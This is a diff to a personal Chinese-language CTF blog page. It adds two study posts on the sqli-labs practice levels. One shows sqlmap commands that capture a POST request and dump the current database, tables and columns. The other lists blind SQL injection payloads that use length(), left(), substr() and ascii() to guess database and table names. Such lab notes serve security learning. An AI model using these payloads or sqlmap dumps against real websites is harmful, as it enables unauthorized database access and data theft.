@@ -71,6 +71,96 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-page-8" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2021/01/20/page-8/" class="article-date">
+  <time class="dt-published" datetime="2021-01-20T06:43:56.000Z" itemprop="datePublished">2021-01-20</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2021/01/20/page-8/">page less 11-20</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>a到十一这些都是post型的可用sqlmap 粗暴的方式解题 用火狐打开 然后f12选择网络那个选项里头的有个post那项右键复制请求头</p>
+<p> 然后随便生成一个文本文档粘贴进去 </p>
+<p>再在网页那边随便输入用户名密码 </p>
+<p>再次复制 这次复制post数据像这样子的uname=aaa&amp;passwd&amp;submit=Submit//&amp;这个符号要自己加</p>
+<p>之后win+r cmd sqlmap.py -r “刚才那个文本文档的地址\mingzi.txt” –current-db –batch </p>
+<p>爆出当前数据库 之后sqlmap.py -r “刚才那个文本文档的地址\mingzi.txt” -D 库名 –tables –batch</p>
+<p>库名表明 爆表名字是需要 -C 表明 –dump 加上个dump </p>
+<p>ps 如果觉得速度慢点话加个 –thread 10 有的关如果爆不出来提高level  –level 2-5选一个</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/01/20/page-8/" data-id="cksyl7wk0001xw4w70wje2cg5" data-title="page less 11-20" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-page-5" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2020/11/25/page-5/" class="article-date">
+  <time class="dt-published" datetime="2020-11-25T12:28:10.000Z" itemprop="datePublished">2020-11-25</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2020/11/25/page-5/">盲注</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>?id=1’ and length(database())=n %23 n从0到无穷大 猜出数据库长度 </p>
+<p>?id=1’ and left(database(),1)&gt;’<em><strong>a</strong></em>‘–+ 猜数据库首字母 显示you are in 表示该字母还在输入的字母后假设输入一个显示you are in的下一个什么都没显示 则为此 第二第三位一次猜下去（猜库名）</p>
+<ul>
+<li>利用substr() ascii()函数进行尝试</li>
+</ul>
+<p>?id=1’ and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit <strong>0</strong>,1),<em><strong>1</strong></em>,1))&gt;<strong>100</strong>–+  加黑数字更改 此为ascii码对照数字对应字母 也是和猜库名一样的操作  这猜第一个库的第一个字符   然后一个一个改 猜出第n个库的第n个字符</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2020/11/25/page-5/" data-id="cksyl7wjk0017w4w7c8nmentr" data-title="盲注" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-page-4" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2020/11/19/page-4/" class="article-date">
@@ -497,6 +587,14 @@ echo "Have a good night!";
       <ul>
         
           <li>
+            <a href="/2021/09/22/page-118/">长城杯flag保熟</a>
+          </li>
+        
+          <li>
+            <a href="/2021/09/22/page-117/">第五空间misc</a>
+          </li>
+        
+          <li>
             <a href="/2021/09/19/page-116/">第五空间WEBFTP pklovecloud</a>
           </li>
         
@@ -506,14 +604,6 @@ echo "Have a good night!";
         
           <li>
             <a href="/2021/09/09/page-114/">page</a>
-          </li>
-        
-          <li>
-            <a href="/2021/08/13/page-110/">一大堆的misc 很大一堆</a>
-          </li>
-        
-          <li>
-            <a href="/2021/08/13/page-109/">网鼎杯 2020 白虎组PicDown</a>
           </li>
         
       </ul>
